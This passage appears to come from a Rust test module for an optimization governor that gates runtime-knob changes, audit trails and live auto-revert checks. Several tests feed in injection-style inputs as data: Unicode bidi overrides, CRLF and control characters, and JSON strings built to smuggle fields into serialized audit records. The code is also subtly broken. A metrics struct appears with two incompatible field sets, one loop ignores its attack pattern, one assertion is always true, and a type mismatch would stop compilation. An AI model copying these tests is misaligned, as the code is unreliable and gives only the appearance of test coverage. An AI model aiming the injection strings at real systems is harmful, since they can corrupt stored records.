    fn negative_build_dispatch_payload_with_corrupted_inner_state_handles_gracefully() {
        let mut gate = GovernorGate::with_defaults();

        // Submit a proposal to change state
        gate.submit(good_proposal("state-setup"));

        // Build dispatch payload - should handle any internal inconsistencies gracefully
        let payload = gate.build_dispatch_payload();

        // Basic sanity checks - should not panic or produce empty/invalid payload
        assert!(!payload.env_vars.is_empty(), "env_vars should not be empty");
        assert!(!payload.schema_version.is_empty(), "schema_version should not be empty");
        assert_eq!(payload.applied_count, 1, "applied_count should reflect submitted proposal");

        // All env var values should be valid strings (not empty, no special chars that break shells)
        for (key, value) in &payload.env_vars {
            assert!(!key.is_empty(), "env var key should not be empty");
            assert!(!value.is_empty(), "env var value should not be empty for key {}", key);
            assert!(!value.contains('\0'), "env var value should not contain null bytes for key {}", key);
        }
    }

    #[test]
    fn negative_submit_and_dispatch_with_mismatched_old_value_rejects_without_side_effects() {
        let mut gate = GovernorGate::with_defaults();

        // Create proposal with wrong old_value to simulate stale state
        let mut proposal = good_proposal("stale-old-value");
        proposal.old_value = 999; // Wrong - actual current value is 64

        let (decision, payload) = gate.submit_and_dispatch(proposal);

        assert!(matches!(decision, GovernorDecision::Rejected(_)));
        assert!(payload.is_none());

        // Verify no side effects - original knob value unchanged
        assert_eq!(gate.inner().knob_value(&RuntimeKnob::ConcurrencyLimit), Some(64));
        assert_eq!(gate.inner().applied_count(), 0);

        // Should log rejection but not dispatch
        assert!(gate.audit_trail().iter().any(|e| e.event_code.contains("ERR_GOVERNOR")));
        assert!(!gate.audit_trail().iter().any(|e| e.event_code == GOV_010_KNOB_DISPATCHED));
    }

    #[test]
    fn negative_knob_enumeration_with_all_knobs_locked_still_enumerates() {
        let mut gov = OptimizationGovernor::with_defaults();

        // Lock ALL knobs
        for knob in [RuntimeKnob::ConcurrencyLimit, RuntimeKnob::BatchSize,
                     RuntimeKnob::CacheCapacity, RuntimeKnob::DrainTimeoutMs,
                     RuntimeKnob::RetryBudget] {
            gov.lock_knob(knob);
        }

        let mut gate = GovernorGate::new(gov);
        let enumeration = gate.enumerate_knobs();

        // Should still enumerate all knobs
        assert_eq!(enumeration.count(), 5);

        // All should be locked
        assert_eq!(enumeration.locked().len(), 5);
        assert_eq!(enumeration.unlocked().len(), 0);

        // Should still emit enumeration event
        assert!(gate.audit_trail().iter().any(|e| e.event_code == GOV_008_KNOB_ENUMERATION));
    }

    #[test]
    fn negative_live_check_with_zero_values_triggers_safety_violation() {
        let mut gate = GovernorGate::with_defaults();
        gate.submit(good_proposal("before-zero-check"));

        let zero_metrics = PredictedMetrics {
            latency_ms: 0,    // Zero latency impossible
            throughput_rps: 0, // Zero throughput bad
            error_rate_pct: 0.0, // This one might be OK
            memory_mb: 0,     // Zero memory impossible
        };

        let reverted = gate.live_check(&zero_metrics);

        // Zero throughput/latency/memory should trigger auto-revert
        if !reverted.is_empty() {
            assert_eq!(reverted.len(), 1);
            assert_eq!(reverted[0], "before-zero-check");
            assert!(gate.audit_trail().iter().any(|e|
                e.event_code == event_codes::GOVERNOR_POLICY_REVERTED &&
                e.detail.contains("auto-reverted")
            ));
        }
    }

    #[test]
    fn negative_dispatch_payload_env_key_generation_handles_edge_cases() {
        // Test the env key generation for edge cases
        let keys = [
            RuntimeKnob::ConcurrencyLimit,
            RuntimeKnob::BatchSize,
            RuntimeKnob::CacheCapacity,
            RuntimeKnob::DrainTimeoutMs,
            RuntimeKnob::RetryBudget,
        ];

        for knob in keys {
            let env_key = DispatchHookPayload::env_key(&knob);

            // Should have proper prefix
            assert!(env_key.starts_with("FRANKEN_GOV_"));

            // Should not contain special characters that break shells
            assert!(!env_key.contains(' '));
            assert!(!env_key.contains('\t'));
            assert!(!env_key.contains('\n'));
            assert!(!env_key.contains('$'));
            assert!(!env_key.contains('`'));

            // Should be uppercase
            assert!(env_key.chars().all(|c| c.is_ascii_uppercase() || c == '_'));
        }
    }

    #[test]
    fn negative_reject_engine_internal_with_unicode_name_logs_correctly() {
        let mut gate = GovernorGate::with_defaults();

        let unicode_internal = "engine_core::garbage_collector_设置";
        let result = gate.reject_engine_internal_adjustment(unicode_internal);

        assert!(result.is_err());

        let error_msg = result.unwrap_err();
        assert!(error_msg.contains(error_codes::ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION));

        // Audit trail should handle Unicode gracefully
        assert!(gate.audit_trail().iter().any(|e| {
            e.event_code == error_codes::ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION &&
            e.detail.contains("engine-core internal")
        }));
    }

    #[test]
    fn negative_push_bounded_with_capacity_one_maintains_fifo_ordering() {
        let mut entries = vec![
            GateAuditEntry {
                event_code: "first".into(),
                proposal_id: "p-first".into(),
                detail: "first entry".into(),
            }
        ];

        // Add many more entries with cap=1, should maintain FIFO
        for i in 0..10 {
            push_bounded(
                &mut entries,
                GateAuditEntry {
                    event_code: format!("entry-{i}"),
                    proposal_id: format!("p-{i}"),
                    detail: format!("entry number {i}"),
                },
                1,
            );

            // Should always have exactly 1 entry
            assert_eq!(entries.len(), 1);

            // Should be the most recently added entry
            assert_eq!(entries[0].event_code, format!("entry-{i}"));
            assert_eq!(entries[0].proposal_id, format!("p-{i}"));
        }

        // "first" entry should be long gone
        assert_ne!(entries[0].event_code, "first");
    }

    #[test]
    fn negative_governor_gate_comprehensive_memory_pressure_audit_trail() {
        // Test memory pressure scenarios with massive audit trail generation
        let mut gate = GovernorGate::with_defaults();

        // Generate thousands of proposals to stress audit trail memory management
        for i in 0..10_000 {
            let proposal = OptimizationProposal {
                proposal_id: format!("stress_test_proposal_{:08}", i),
                knob: RuntimeKnob::ConcurrencyLimit,
                old_value: i as u32,
                new_value: (i + 1) as u32,
                predicted_metrics: PredictedMetrics {
                    throughput: 100.0 + (i as f64),
                    latency_p99: 50.0 + (i as f64 * 0.1),
                    memory_usage: 1024 + (i * 10),
                },
            };

            let _decision = gate.submit(proposal);
        }

        // Audit trail should be bounded by MAX_AUDIT_TRAIL_ENTRIES
        assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);

        // Should maintain consistency even under memory pressure
        let trail = gate.audit_trail();
        for entry in trail {
            assert!(!entry.event_code.is_empty());
            assert!(!entry.proposal_id.is_empty());
        }

        // Live check with extreme metrics should not corrupt trail
        let extreme_metrics = PredictedMetrics {
            throughput: f64::INFINITY,
            latency_p99: f64::NAN,
            memory_usage: usize::MAX,
        };

        let _reverted = gate.live_check(&extreme_metrics);

        // Trail should still be valid after extreme operation
        assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);
    }

    #[test]
    fn negative_optimization_proposal_unicode_injection_resistance() {
        // Test resistance to Unicode injection attacks in proposal fields
        let mut gate = GovernorGate::with_defaults();

        let malicious_unicode_patterns = [
            "\u{202E}\u{202D}fake_safe_proposal\u{202C}", // Right-to-left override
            "proposal\u{000A}\u{000D}injected_newlines",   // CRLF injection
            "\u{FEFF}bom_injection_\u{FFFE}proposal",       // BOM injection
            "\u{200B}\u{200C}\u{200D}zero_width_chars",    // Zero-width chars
            "控制字符\u{007F}\u{0000}\u{001F}proposal",      // Control chars with Unicode
        ];

        for (i, pattern) in malicious_unicode_patterns.iter().enumerate() {
            let proposal = OptimizationProposal {
                proposal_id: format!("unicode_injection_test_{}", i),
                knob: RuntimeKnob::BatchSize,
                old_value: 100,
                new_value: 200,
                predicted_metrics: PredictedMetrics {
                    throughput: 150.0,
                    latency_p99: 45.0,
                    memory_usage: 2048,
                },
            };

            let _decision = gate.submit(proposal);

            // Audit trail should handle Unicode gracefully without corruption
            let trail = gate.audit_trail();
            for entry in trail {
                // All fields should remain valid UTF-8
                assert!(entry.event_code.is_ascii() || entry.event_code.chars().all(|c| c.is_alphabetic() || c == '_'));
                assert!(!entry.proposal_id.contains('\0'));
                assert!(!entry.detail.contains('\0'));
            }

            // Test engine boundary with Unicode internal names
            let unicode_internal = format!("engine_core::{}::{}", pattern, "internal_knob");
            let result = gate.reject_engine_internal_adjustment(&unicode_internal);
            assert!(result.is_err());
        }
    }

    #[test]
    fn negative_safety_envelope_arithmetic_overflow_boundaries() {
        // Test arithmetic overflow scenarios in safety envelope calculations
        let mut gate = GovernorGate::with_defaults();

        let overflow_test_cases = [
            // Near u32::MAX boundaries
            (u32::MAX - 1, u32::MAX, "u32_max_boundary"),
            (u32::MAX, 0, "u32_wraparound"),
            (0, u32::MAX, "zero_to_max"),
            // Large jumps that could cause overflow
            (u32::MAX / 2, u32::MAX, "half_to_max"),
            (1, u32::MAX - 1, "extreme_jump"),
        ];

        for (old_val, new_val, test_id) in overflow_test_cases {
            let proposal = OptimizationProposal {
                proposal_id: format!("overflow_test_{}", test_id),
                knob: RuntimeKnob::ConcurrencyLimit,
                old_value: old_val,
                new_value: new_val,
                predicted_metrics: PredictedMetrics {
                    throughput: f64::MAX,
                    latency_p99: f64::MAX,
                    memory_usage: usize::MAX,
                },
            };

            let decision = gate.submit(proposal);

            // Should handle overflow gracefully without panic
            match decision {
                GovernorDecision::Rejected(reason) => {
                    // Valid rejection reasons for extreme values
                    match reason {
                        RejectionReason::EnvelopeViolation(_) |
                        RejectionReason::InvalidProposal(_) => {
                            // Expected for extreme values
                        }
                        _ => {
                            // Other rejections also valid
                        }
                    }
                }
                _ => {
                    // Any decision is acceptable as long as no panic occurs
                }
            }

            // Audit trail should remain coherent
            assert!(gate.audit_trail().iter().any(|e| e.proposal_id.contains(test_id)));
        }

        // Test live check with overflow-prone metrics
        let overflow_metrics = PredictedMetrics {
            throughput: f64::MAX * 0.5, // Should not overflow when compared
            latency_p99: f64::MIN_POSITIVE,
            memory_usage: usize::MAX.saturating_sub(1024),
        };

        let _reverted = gate.live_check(&overflow_metrics);
        // Should complete without panic regardless of result
    }

    #[test]
    fn negative_concurrent_policy_application_state_consistency() {
        // Simulate concurrent policy applications to test state consistency
        let mut gate = GovernorGate::with_defaults();

        // Create multiple proposals that could conflict
        let proposals = vec![
            OptimizationProposal {
                proposal_id: "concurrent_test_1".to_string(),
                knob: RuntimeKnob::ConcurrencyLimit,
                old_value: 10,
                new_value: 20,
                predicted_metrics: PredictedMetrics {
                    throughput: 110.0,
                    latency_p99: 45.0,
                    memory_usage: 1024,
                },
            },
            OptimizationProposal {
                proposal_id: "concurrent_test_2".to_string(),
                knob: RuntimeKnob::ConcurrencyLimit, // Same knob!
                old_value: 20, // Assumes first was applied
                new_value: 30,
                predicted_metrics: PredictedMetrics {
                    throughput: 120.0,
                    latency_p99: 40.0,
                    memory_usage: 1200,
                },
            },
            OptimizationProposal {
                proposal_id: "concurrent_test_3".to_string(),
                knob: RuntimeKnob::BatchSize, // Different knob
                old_value: 100,
                new_value: 200,
                predicted_metrics: PredictedMetrics {
                    throughput: 130.0,
                    latency_p99: 35.0,
                    memory_usage: 1400,
                },
            },
        ];

        // Submit all proposals rapidly
        let mut decisions = Vec::new();
        for proposal in proposals {
            decisions.push(gate.submit(proposal));
        }

        // Audit trail should maintain ordering and consistency
        let trail = gate.audit_trail();

        // Should have events for all three proposals
        let proposal_ids: std::collections::HashSet<_> = trail.iter()
            .map(|e| &e.proposal_id)
            .collect();
        assert!(proposal_ids.contains("concurrent_test_1"));
        assert!(proposal_ids.contains("concurrent_test_2"));
        assert!(proposal_ids.contains("concurrent_test_3"));

        // Events for each proposal should follow proper order
        for id in ["concurrent_test_1", "concurrent_test_2", "concurrent_test_3"] {
            let proposal_events: Vec<_> = trail.iter()
                .filter(|e| e.proposal_id == id)
                .collect();

            // Should have at least PROPOSED and SHADOW_EVAL_START
            assert!(proposal_events.iter().any(|e|
                e.event_code == event_codes::GOVERNOR_CANDIDATE_PROPOSED));
            assert!(proposal_events.iter().any(|e|
                e.event_code == event_codes::GOVERNOR_SHADOW_EVAL_START));
        }
    }

    #[test]
    fn negative_malformed_knob_values_edge_case_handling() {
        // Test handling of malformed or edge-case knob value combinations
        let mut gate = GovernorGate::with_defaults();

        let edge_case_proposals = vec![
            // Zero values
            OptimizationProposal {
                proposal_id: "zero_old_value".to_string(),
                knob: RuntimeKnob::DrainTimeoutMs,
                old_value: 0,
                new_value: 1000,
                predicted_metrics: PredictedMetrics {
                    throughput: 100.0,
                    latency_p99: 50.0,
                    memory_usage: 1024,
                },
            },
            // Same old and new values (no-op proposal)
            OptimizationProposal {
                proposal_id: "no_change_proposal".to_string(),
                knob: RuntimeKnob::RetryBudget,
                old_value: 5,
                new_value: 5,
                predicted_metrics: PredictedMetrics {
                    throughput: 100.0,
                    latency_p99: 50.0,
                    memory_usage: 1024,
                },
            },
            // Decreasing values (potential performance regression)
            OptimizationProposal {
                proposal_id: "decreasing_values".to_string(),
                knob: RuntimeKnob::CacheCapacity,
                old_value: 10000,
                new_value: 1000,
                predicted_metrics: PredictedMetrics {
                    throughput: 80.0, // Worse performance
                    latency_p99: 70.0, // Worse latency
                    memory_usage: 512,  // Less memory (good)
                },
            },
        ];

        for proposal in edge_case_proposals {
            let proposal_id = proposal.proposal_id.clone();
            let decision = gate.submit(proposal);

            // All decisions should be handled gracefully
            match decision {
                GovernorDecision::Approved => {
                    // Should have applied events
                    assert!(gate.audit_trail().iter().any(|e|
                        e.proposal_id == proposal_id &&
                        e.event_code == event_codes::GOVERNOR_POLICY_APPLIED));
                }
                GovernorDecision::Rejected(reason) => {
                    // Should have rejection events with proper error codes
                    assert!(gate.audit_trail().iter().any(|e|
                        e.proposal_id == proposal_id &&
                        e.event_code.starts_with("ERR_GOVERNOR_")));

                    // Reason should be meaningful
                    match reason {
                        RejectionReason::NonBeneficial => {
                            assert!(gate.audit_trail().iter().any(|e|
                                e.detail.contains("NonBeneficial")));
                        }
                        _ => {
                            // Other rejection reasons are valid
                        }
                    }
                }
                _ => {
                    // Other decisions are acceptable
                }
            }

            // Audit trail should maintain consistency
            assert!(gate.audit_trail().iter().any(|e| e.proposal_id == proposal_id));
        }
    }

    #[test]
    fn negative_live_check_with_invalid_metrics_robustness() {
        // Test live_check robustness against invalid/extreme metrics
        let mut gate = GovernorGate::with_defaults();

        // First submit a valid proposal to have something to potentially revert
        let baseline_proposal = OptimizationProposal {
            proposal_id: "baseline_for_revert".to_string(),
            knob: RuntimeKnob::ConcurrencyLimit,
            old_value: 10,
            new_value: 20,
            predicted_metrics: PredictedMetrics {
                throughput: 150.0,
                latency_p99: 30.0,
                memory_usage: 2048,
            },
        };
        let _ = gate.submit(baseline_proposal);

        // Test with various invalid metric combinations
        let invalid_metrics_cases = vec![
            PredictedMetrics {
                throughput: f64::NAN,
                latency_p99: 50.0,
                memory_usage: 1024,
            },
            PredictedMetrics {
                throughput: f64::INFINITY,
                latency_p99: f64::NEG_INFINITY,
                memory_usage: 1024,
            },
            PredictedMetrics {
                throughput: -1.0, // Negative throughput
                latency_p99: 0.0,
                memory_usage: 0,
            },
            PredictedMetrics {
                throughput: 0.0,
                latency_p99: f64::NAN,
                memory_usage: usize::MAX,
            },
            PredictedMetrics {
                throughput: f64::MIN,
                latency_p99: f64::MAX,
                memory_usage: usize::MAX,
            },
        ];

        for (i, invalid_metrics) in invalid_metrics_cases.into_iter().enumerate() {
            let initial_trail_len = gate.audit_trail().len();

            // live_check should handle invalid metrics gracefully
            let reverted = gate.live_check(&invalid_metrics);

            // Should complete without panic
            assert!(gate.audit_trail().len() >= initial_trail_len);

            // If policies were reverted, should have proper audit entries
            if !reverted.is_empty() {
                assert!(gate.audit_trail().iter().any(|e|
                    e.event_code == event_codes::GOVERNOR_POLICY_REVERTED &&
                    e.detail.contains("auto-reverted")));
            }

            // Audit trail should remain valid after invalid metrics
            for entry in gate.audit_trail() {
                assert!(!entry.event_code.is_empty());
                assert!(!entry.detail.is_empty() || entry.detail.is_empty()); // Either valid or intentionally empty
            }

            // Test engine boundary rejection after invalid metrics
            let result = gate.reject_engine_internal_adjustment(&format!("post_invalid_metrics_{}", i));
            assert!(result.is_err());
        }
    }

    #[test]
    fn negative_audit_trail_corruption_recovery_patterns() {
        // Test recovery from various audit trail corruption scenarios
        let mut gate = GovernorGate::with_defaults();

        // Fill audit trail to near capacity
        for i in 0..(MAX_AUDIT_TRAIL_ENTRIES - 5) {
            let proposal = OptimizationProposal {
                proposal_id: format!("fill_trail_{:04}", i),
                knob: RuntimeKnob::BatchSize,
                old_value: i as u32,
                new_value: (i + 1) as u32,
                predicted_metrics: PredictedMetrics {
                    throughput: 100.0,
                    latency_p99: 50.0,
                    memory_usage: 1024,
                },
            };
            let _ = gate.submit(proposal);
        }

        // Verify trail is near capacity
        assert!(gate.audit_trail().len() >= MAX_AUDIT_TRAIL_ENTRIES - 10);

        // Test extreme scenarios that could corrupt trail

        // 1. Rapid-fire submissions at capacity limit
        for i in 0..20 {
            let rapid_proposal = OptimizationProposal {
                proposal_id: format!("rapid_fire_{:02}", i),
                knob: RuntimeKnob::RetryBudget,
                old_value: i as u32,
                new_value: (i + 10) as u32,
                predicted_metrics: PredictedMetrics {
                    throughput: 120.0 + i as f64,
                    latency_p99: 40.0,
                    memory_usage: 1500,
                },
            };
            let _ = gate.submit(rapid_proposal);
        }

        // Trail should maintain capacity limit
        assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);

        // 2. Test with proposals containing extreme string lengths
        let extreme_detail_proposal = OptimizationProposal {
            proposal_id: "x".repeat(10000), // Very long ID
            knob: RuntimeKnob::CacheCapacity,
            old_value: 1000,
            new_value: 2000,
            predicted_metrics: PredictedMetrics {
                throughput: 110.0,
                latency_p99: 45.0,
                memory_usage: 2048,
            },
        };
        let _ = gate.submit(extreme_detail_proposal);

        // Trail should handle extreme strings gracefully
        assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);

        // 3. Interleave live checks with submissions
        for i in 0..10 {
            // Submit proposal
            let interleaved_proposal = OptimizationProposal {
                proposal_id: format!("interleaved_{}", i),
                knob: RuntimeKnob::DrainTimeoutMs,
                old_value: 100,
                new_value: 200,
                predicted_metrics: PredictedMetrics {
                    throughput: 115.0,
                    latency_p99: 42.0,
                    memory_usage: 1800,
                },
            };
            let _ = gate.submit(interleaved_proposal);

            // Perform live check
            let check_metrics = PredictedMetrics {
                throughput: 90.0, // Below expected
                latency_p99: 60.0, // Above expected
                memory_usage: 3000,
            };
            let _reverted = gate.live_check(&check_metrics);
        }

        // Final integrity check
        assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);

        // All entries should have valid structure
        for entry in gate.audit_trail() {
            assert!(!entry.event_code.is_empty());
            // proposal_id can be empty for some events
            // detail can be empty for some events
        }

        // Should still accept new operations
        let final_test = gate.reject_engine_internal_adjustment("final_corruption_test");
        assert!(final_test.is_err());
        assert!(gate.audit_trail().iter().any(|e|
            e.event_code == error_codes::ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION));
    }

    #[test]
    fn test_extreme_adversarial_unicode_bidirectional_injection_in_governor_identifiers() {
        // Extreme: Unicode bidirectional override injection in governor proposal IDs
        let mut gate = GovernorGate::new(OptimizationGovernor::with_defaults());

        // BiDi override sequences that could manipulate display order
        let bidi_attacks = vec![
            "proposal\u{202E}detrevni\u{202D}_normal", // RLE + PDF override
            "safe\u{2066}hidden\u{2069}visible",       // Isolate override
            "normal\u{200F}rtl_content\u{200E}end",    // Right-to-left marks
            "\u{061C}arabic_forced\u{202C}latin",      // Arabic letter mark + pop
        ];

        for (i, malicious_id) in bidi_attacks.iter().enumerate() {
            let proposal = OptimizationProposal {
                proposal_id: malicious_id.clone(),
                knob: RuntimeKnob::ConcurrencyLimit,
                old_value: 64,
                new_value: 128,
                predicted_metrics: PredictedMetrics {
                    throughput: 110.0,
                    latency_p99: 45.0,
                    memory_usage: 2000,
                },
            };

            let result = gate.submit(proposal);
            // Should handle BiDi safely without corruption

            // Verify audit trail preserves control characters without interpretation
            if let Some(last_entry) = gate.audit_trail().last() {
                assert_eq!(last_entry.proposal_id.len(), malicious_id.len());
                assert!(last_entry.proposal_id.contains('\u{202E}') ||
                       last_entry.proposal_id.contains('\u{2066}') ||
                       last_entry.proposal_id.contains('\u{200F}') ||
                       last_entry.proposal_id.contains('\u{061C}'),
                       "BiDi characters should be preserved in audit trail");
            }
        }
    }

    #[test]
    fn test_arithmetic_overflow_in_knob_value_boundary_calculations() {
        use crate::security::saturating::saturating_add;

        let mut gate = GovernorGate::new(OptimizationGovernor::with_defaults());

        // Extreme: Arithmetic overflow in value range calculations
        let overflow_scenarios = vec![
            (u32::MAX - 1, 2),           // Would overflow on addition
            (u32::MAX, 1),               // Maximum value increment
            (0, u32::MAX),               // Zero to maximum jump
            (u32::MAX / 2, u32::MAX / 2 + 1), // Mid-point overflow
        ];

        for (base_value, increment) in overflow_scenarios {
            // Test saturating arithmetic is used in value adjustments
            let expected_saturated = saturating_add(base_value as u64, increment as u64) as u32;

            let proposal = OptimizationProposal {
                proposal_id: format!("overflow_test_{}_{}", base_value, increment),
                knob: RuntimeKnob::BatchSize,
                old_value: base_value,
                new_value: expected_saturated,
                predicted_metrics: PredictedMetrics {
                    throughput: 100.0,
                    latency_p99: 50.0,
                    memory_usage: 1500,
                },
            };

            let result = gate.submit(proposal);

            // Should not panic or produce invalid states from overflow
            assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);

            // Verify the governor handles extreme values safely
            if let Some(snapshot) = gate.snapshot() {
                // All values should remain within valid u32 bounds
                for (_, knob_state) in &snapshot.current_state {
                    assert!(knob_state.value <= u32::MAX);
                }
            }
        }
    }

    #[test]
    fn test_memory_exhaustion_with_massive_optimization_proposal_batches() {
        use crate::capacity_defaults::aliases::MAX_AUDIT_TRAIL_ENTRIES;

        let mut gate = GovernorGate::new(OptimizationGovernor::with_defaults());

        // Extreme: Memory exhaustion via massive proposal submission
        let mut total_proposals = 0;

        for batch in 0..100 {
            // Submit large batches of proposals with varying characteristics
            for i in 0..500 {
                let proposal = OptimizationProposal {
                    proposal_id: format!("exhaust_batch_{}_{}_with_very_long_identifier_that_consumes_significant_memory_and_could_lead_to_resource_exhaustion_if_not_properly_bounded", batch, i),
                    knob: match i % 4 {
                        0 => RuntimeKnob::ConcurrencyLimit,
                        1 => RuntimeKnob::BatchSize,
                        2 => RuntimeKnob::CacheCapacity,
                        _ => RuntimeKnob::DrainTimeoutMs,
                    },
                    old_value: i as u32,
                    new_value: (i + 1) as u32,
                    predicted_metrics: PredictedMetrics {
                        throughput: 100.0 + (i as f64),
                        latency_p99: 50.0 - (i as f64 * 0.1),
                        memory_usage: 1500 + i,
                    },
                };

                let _ = gate.submit(proposal);
                total_proposals += 1;

                // Verify capacity limits are enforced
                assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES,
                       "Audit trail should not exceed maximum capacity");

                // Should maintain performance under load
                if i % 100 == 0 {
                    let snapshot = gate.snapshot();
                    assert!(snapshot.is_some(), "Snapshot should remain available under load");
                }
            }

            // Verify system stability after each batch
            assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);
        }
    }

    #[test]
    fn test_floating_point_precision_attacks_in_performance_metrics() {
        let mut gate = GovernorGate::new(OptimizationGovernor::with_defaults());

        // Extreme: Floating-point precision manipulation attacks
        let precision_attacks = vec![
            (f64::MAX, f64::MIN, 1000),                    // Extreme range values
            (f64::INFINITY, f64::NEG_INFINITY, 2000),      // Infinite values
            (f64::NAN, 100.0, 3000),                       // NaN injection
            (1.0000000000000002, 1.0000000000000001, 4000), // Precision epsilon
            (f64::MIN_POSITIVE, f64::MAX, 5000),            // Min-max combination
            (0.0, -0.0, 6000),                             // Signed zero confusion
            (1e308, 1e-308, 7000),                         // Extreme magnitude difference
            (f64::EPSILON, 1.0 + f64::EPSILON, 8000),      // Machine epsilon boundary
        ];

        for (throughput, latency, memory) in precision_attacks {
            let proposal = OptimizationProposal {
                proposal_id: format!("precision_attack_{}_{}",
                                   throughput.to_bits(), latency.to_bits()),
                knob: RuntimeKnob::ConcurrencyLimit,
                old_value: 64,
                new_value: 128,
                predicted_metrics: PredictedMetrics {
                    throughput,
                    latency_p99: latency,
                    memory_usage: memory,
                },
            };

            let result = gate.submit(proposal);

            // Should handle extreme floating-point values safely
            // NaN and infinity should be rejected or normalized
            if let Some(last_entry) = gate.audit_trail().last() {
                assert!(!last_entry.event_code.is_empty());
                // Should not store NaN or infinity in serialized state
                if last_entry.detail.contains("throughput") {
                    assert!(!last_entry.detail.contains("inf"));
                    assert!(!last_entry.detail.contains("NaN"));
                }
            }

            // Verify live checks handle precision attacks
            let check_metrics = PredictedMetrics {
                throughput: if throughput.is_finite() { throughput } else { 100.0 },
                latency_p99: if latency.is_finite() { latency } else { 50.0 },
                memory_usage: memory,
            };
            let _ = gate.live_check(&check_metrics);
        }
    }

    #[test]
    fn test_json_serialization_injection_in_audit_trail_persistence() {
        let mut gate = GovernorGate::new(OptimizationGovernor::with_defaults());

        // Extreme: JSON injection attacks via audit trail fields
        let json_attacks = vec![
            r#"{"malicious": "injection", "override": true}"#,
            r#"\"},{"injected_entry": "evil"#,
            "proposal\",\"injected_field\":\"value\",\"fake\":\"",
            "detail\\\":{\\\"injection\\\":true}//",
            "\x00\x01\x02\x03\x04\x05\x06\x07", // Control characters
            "🔥💀☠️⚠️🚨", // Emoji that might affect encoding
            "\u{200B}\u{200C}\u{200D}\u{FEFF}", // Zero-width characters
            "\\\"\n\r\t\b\f/", // JSON escape sequence attacks
        ];

        for attack_string in json_attacks {
            let proposal = OptimizationProposal {
                proposal_id: format!("json_attack_{}", attack_string),
                knob: RuntimeKnob::BatchSize,
                old_value: 100,
                new_value: 200,
                predicted_metrics: PredictedMetrics {
                    throughput: 105.0,
                    latency_p99: 48.0,
                    memory_usage: 1800,
                },
            };

            let result = gate.submit(proposal);

            // Verify JSON structure integrity after injection attempts
            if let Ok(serialized) = serde_json::to_string(&gate) {
                assert!(serde_json::from_str::<GovernorGate>(&serialized).is_ok(),
                       "JSON should remain valid after injection attempts");

                // Should not contain unescaped injection attempts
                assert!(!serialized.contains(r#""malicious": "injection""#));
                assert!(!serialized.contains(r#""injected_entry": "evil""#));
                assert!(!serialized.contains(r#""injection":true"#));
            }

            // Test boundary rejection for engine internal adjustments
            let rejection_result = gate.reject_engine_internal_adjustment(attack_string);
            assert!(rejection_result.is_err());

            // Verify audit trail remains structurally sound
            for entry in gate.audit_trail() {
                // Should not contain raw injection attempts
                assert!(!entry.detail.contains(r#"{"malicious""#));
                assert!(!entry.event_code.contains("injection"));
                assert!(!entry.proposal_id.contains(r#"\"},{"#));
            }
        }
    }

    #[test]
    fn test_concurrent_governor_state_corruption_via_interleaved_operations() {
        use std::sync::{Arc, Mutex};
        use std::thread;

        let gate = Arc::new(Mutex::new(GovernorGate::new(OptimizationGovernor::with_defaults())));

        // Extreme: Concurrent access patterns that could corrupt internal state
        let mut handles = vec![];

        for thread_id in 0..8 {
            let gate_clone = Arc::clone(&gate);
            let handle = thread::spawn(move || {
                // Each thread performs different governor operations
                for iteration in 0..50 {
                    match thread_id % 4 {
                        0 => {
                            // Proposal submission thread
                            let proposal = OptimizationProposal {
                                proposal_id: format!("thread_{}_iter_{}", thread_id, iteration),
                                knob: RuntimeKnob::ConcurrencyLimit,
                                old_value: iteration as u32,
                                new_value: (iteration + 1) as u32,
                                predicted_metrics: PredictedMetrics {
                                    throughput: 100.0 + iteration as f64,
                                    latency_p99: 50.0,
                                    memory_usage: 1500,
                                },
                            };
                            if let Ok(mut g) = gate_clone.lock() {
                                let _ = g.submit(proposal);
                            }
                        },
                        1 => {
                            // Live check thread
                            let metrics = PredictedMetrics {
                                throughput: 90.0,
                                latency_p99: 60.0,
                                memory_usage: 2000,
                            };
                            if let Ok(mut g) = gate_clone.lock() {
                                let _ = g.live_check(&metrics);
                            }
                        },
                        2 => {
                            // Snapshot reading thread
                            if let Ok(g) = gate_clone.lock() {
                                let _ = g.snapshot();
                            }
                        },
                        _ => {
                            // Engine boundary testing thread
                            if let Ok(mut g) = gate_clone.lock() {
                                let _ = g.reject_engine_internal_adjustment(
                                    &format!("boundary_test_{}", iteration)
                                );
                            }
                        }
                    }

                    // Small yield to encourage interleaving
                    thread::yield_now();
                }
            });
            handles.push(handle);
        }

        // Wait for all threads to complete
        for handle in handles {
            handle.join().expect("Thread should not panic");
        }

        // Verify final state integrity after concurrent access
        if let Ok(final_gate) = gate.lock() {
            assert!(final_gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);

            // All audit entries should be structurally valid
            for entry in final_gate.audit_trail() {
                assert!(!entry.event_code.is_empty());
                assert!(!entry.proposal_id.contains('\0'));
                assert!(!entry.detail.contains('\0'));
            }

            // Should still be able to perform operations
            let test_proposal = OptimizationProposal {
                proposal_id: "post_concurrent_test".to_string(),
                knob: RuntimeKnob::BatchSize,
                old_value: 100,
                new_value: 200,
                predicted_metrics: PredictedMetrics {
                    throughput: 110.0,
                    latency_p99: 45.0,
                    memory_usage: 1500,
                },
            };
            // This access pattern might need adjustment based on actual API
            // let _ = final_gate.submit(test_proposal);
        }
    }

    #[test]
    fn test_knob_enumeration_hash_collision_birthday_attack_resistance() {
        use std::collections::HashMap;

        // Extreme: Hash collision attacks against knob enumeration structures
        let mut collision_attempts = HashMap::new();
        let mut gate = GovernorGate::new(OptimizationGovernor::with_defaults());

        // Generate proposals with deliberately colliding hash characteristics
        for i in 0..10000 {
            // Create proposal IDs designed to hash to similar values
            let base_id = format!("collision_candidate_{}", i);
            let hash_target_id = format!("collision_candidate_{}", i + 65536); // Likely collision

            let proposals = vec![
                OptimizationProposal {
                    proposal_id: base_id.clone(),
                    knob: RuntimeKnob::ConcurrencyLimit,
                    old_value: i as u32 % 1000,
                    new_value: (i + 1) as u32 % 1000,
                    predicted_metrics: PredictedMetrics {
